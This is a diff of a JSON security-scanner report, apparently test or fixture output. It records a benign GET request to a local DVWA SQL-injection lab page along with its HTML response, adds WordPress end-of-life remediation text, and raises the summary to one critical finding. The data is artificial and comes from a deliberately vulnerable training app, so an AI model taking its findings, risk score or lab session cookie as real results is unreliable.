-                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAge: 5712\r\nAllow: GET, HEAD\r\nCf-Cache-Status: HIT\r\nCf-Ray: 9eea09173eeb7fc2-MAA\r\nContent-Type: text/html\r\nDate: Sun, 19 Apr 2026 07:01:00 GMT\r\nLast-Modified: Sat, 18 Apr 2026 00:49:31 GMT\r\nServer: cloudflare\r\n\r\n<!doctype html><html lang=\"en\"><head><title>Example Domain</title><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href=\"https://iana.org/domains/example\">Learn more</a></p></div></body></html>\n"
+                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43' 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit'",
+                "request": "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Sat, 25 Apr 2026 12:25:49 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: SQL Injection</h1>\r\n\r\n\t\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tUser ID:\n\t\t\t\t<input type=\"text\" size=\"15\" name=\"id\">\n\t\t\t\t<input type=\"submit\" name=\"Submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"http://www.securiteam.com/securityreviews/5DP0N1P76E.html\" target=\"_blank\">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/SQL_injection\" target=\"_blank\">https://en.wikipedia.org/wiki/SQL_injection</a></li>\r\n\t\t<li><a href=\"http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\" target=\"_blank\">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a></li>\r\n\t\t<li><a href=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\" target=\"_blank\">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/SQL_Injection\" target=\"_blank\">https://www.owasp.org/index.php/SQL_Injection</a></li>\r\n\t\t<li><a href=\"http://bobby-tables.com/\" target=\"_blank...(truncated)"
             },
-            "impact": "",
-            "remediation": "",
-            "references": [],
+            "impact": "End-of-life software may contain unpatched vulnerabilities, increasing the likelihood and impact of exploitation.",
+            "remediation": "Upgrade the affected platform to a supported (non-EOL) version and apply the latest security patches.",
+            "references": [
+                "https://endoflife.date/wordpress",
+                "https://wordpress.org/documentation/article/wordpress-versions/"
+            ],
             "tags": [
                 "tech",
-                "discovery",
-                "http",
-                "tech-detect"
+                "wordpress",
+                "eol",
+                "wordpress-eol"
             ]
         }
     ],
     "summary": {
-        "total_findings": 3,
-        "critical": 0,
+        "total_findings": 5,
+        "critical": 1,
         "high": 0,
         "medium": 0,
         "low": 0,
-        "info": 3,
-        "risk_score": 0.0
+        "info": 4,
+        "risk_score": 10.0
     }
 }
